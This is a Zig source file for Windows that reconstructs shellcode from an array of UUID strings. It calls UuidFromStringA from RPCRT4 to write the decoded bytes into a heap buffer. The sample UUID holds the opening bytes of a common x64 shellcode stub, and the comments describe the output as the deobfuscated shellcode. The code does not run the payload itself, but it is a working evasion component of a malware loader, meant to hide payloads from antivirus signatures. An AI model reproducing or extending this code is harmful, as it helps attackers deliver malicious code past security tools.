const std = @import("std");
const windows = std.os.windows;
const WINAPI = windows.WINAPI;

// Type definitions
const RPC_STATUS = u32;
const RPC_CSTR = [*:0]const u8;
const UUID = extern struct {
    data1: u32,
    data2: u16,
    data3: u16,
    data4: [8]u8,
};

const RPC_S_OK: RPC_STATUS = 0;

// Function pointer type for UuidFromStringA
const UuidFromStringAFn = *const fn (RPC_CSTR, *UUID) callconv(WINAPI) RPC_STATUS;

// External function declarations
extern "kernel32" fn GetProcAddress(hModule: windows.HMODULE, lpProcName: [*:0]const u8) callconv(WINAPI) ?windows.FARPROC;
extern "kernel32" fn LoadLibraryA(lpLibFileName: [*:0]const u8) callconv(WINAPI) ?windows.HMODULE;
extern "kernel32" fn GetProcessHeap() callconv(WINAPI) windows.HANDLE;
extern "kernel32" fn HeapAlloc(hHeap: windows.HANDLE, dwFlags: windows.DWORD, dwBytes: usize) callconv(WINAPI) ?*anyopaque;
extern "kernel32" fn HeapFree(hHeap: windows.HANDLE, dwFlags: windows.DWORD, lpMem: ?*anyopaque) callconv(WINAPI) windows.BOOL;
extern "kernel32" fn GetLastError() callconv(WINAPI) windows.DWORD;

const HEAP_ZERO_MEMORY: windows.DWORD = 0x00000008;

pub fn uuidDeobfuscation(
    uuid_array: []const [*:0]const u8,
    pp_d_address: *?[*]u8,
    p_d_size: *usize,
) bool {
    // Getting UuidFromStringA address from Rpcrt4.dll
    const rpcrt4_handle = LoadLibraryA("RPCRT4") orelse {
        std.debug.print("[!] LoadLibrary Failed With Error : {}\n", .{GetLastError()});
        return false;
    };

    const proc_addr = GetProcAddress(rpcrt4_handle, "UuidFromStringA") orelse {
        std.debug.print("[!] GetProcAddress Failed With Error : {}\n", .{GetLastError()});
        return false;
    };

    const uuid_from_string_a: UuidFromStringAFn = @ptrCast(proc_addr);

    // Getting the real size of the shellcode which is the number of UUID strings * 16
    const buff_size = uuid_array.len * 16;

    // Allocating memory which will hold the deobfuscated shellcode
    const buffer_ptr = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buff_size) orelse {
        std.debug.print("[!] HeapAlloc Failed With Error : {}\n", .{GetLastError()});
        return false;
    };

    const buffer: [*]u8 = @ptrCast(buffer_ptr);
    var tmp_buffer: [*]u8 = buffer;

    // Loop through all the UUID strings saved in uuid_array
    for (uuid_array, 0..) |uuid_string, i| {
        // Deobfuscating one UUID string at a time
        _ = i; // Suppress unused variable warning
        const status = uuid_from_string_a(uuid_string, @ptrCast(@alignCast(tmp_buffer)));

        if (status != RPC_S_OK) {
            std.debug.print("[!] UuidFromStringA Failed At [{s}] With Error 0x{X:0>8}\n", .{ uuid_string, status });
            return false;
        }

        // 16 bytes are written to tmp_buffer at a time
        // Therefore tmp_buffer will be incremented by 16 to store the upcoming 16 bytes
        tmp_buffer += 16;
    }

    pp_d_address.* = buffer;
    p_d_size.* = buff_size;

    return true;
}

// Example usage
pub fn main() !void {
    // Example UUID array (you would replace this with actual UUIDs)
    const uuid_array = [_][*:0]const u8{"E48348FC-E8F0-00C0-0000-415141505251"};
    var deobfuscated_data: ?[*]u8 = null;
    var data_size: usize = 0;

    if (uuidDeobfuscation(uuid_array[0..], &deobfuscated_data, &data_size)) {
        std.debug.print("[+] Deobfuscation successful! Size: {} bytes\n", .{data_size});

        // Use the deobfuscated data here
        if (deobfuscated_data) |data| {
            // Example: print first few bytes
            for (0..@min(data_size, 32)) |i| {
                std.debug.print("{X:0>2} ", .{data[i]});
            }
            std.debug.print("\n", .{}); // Fixed: empty tuple instead of empty braces

            // Free allocated memory
            _ = HeapFree(GetProcessHeap(), 0, data);
        }
    } else {
        std.debug.print("[!] Deobfuscation failed!\n", .{}); // Fixed: empty tuple instead of empty braces
    }
}
